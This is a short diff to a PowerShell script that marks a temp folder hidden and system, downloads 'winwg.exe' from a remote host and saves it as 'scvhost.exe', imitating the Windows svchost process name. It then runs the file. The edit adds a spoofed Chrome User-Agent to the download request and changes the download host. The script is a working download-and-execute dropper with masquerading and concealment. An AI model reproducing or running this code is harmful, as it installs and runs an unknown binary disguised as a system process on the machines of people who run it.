@@ -10,8 +10,8 @@ if (-not (Test-Path $temp)) {
     $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 }
 
-Invoke-WebRequest -Uri "https://update.jerryyytheduck.id.vn/files/winwg.exe" -OutFile (Join-Path $temp "scvhost.exe")
-
+$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" }
+Invoke-WebRequest -Uri "https://jerryyytheduck.id.vn/files/winwg.exe" -OutFile (Join-Path $temp "scvhost.exe") -Headers $headers -Verbose
 
 
 Start-Process -FilePath (Join-Path $temp scvhost.exe) -NoNewWindow
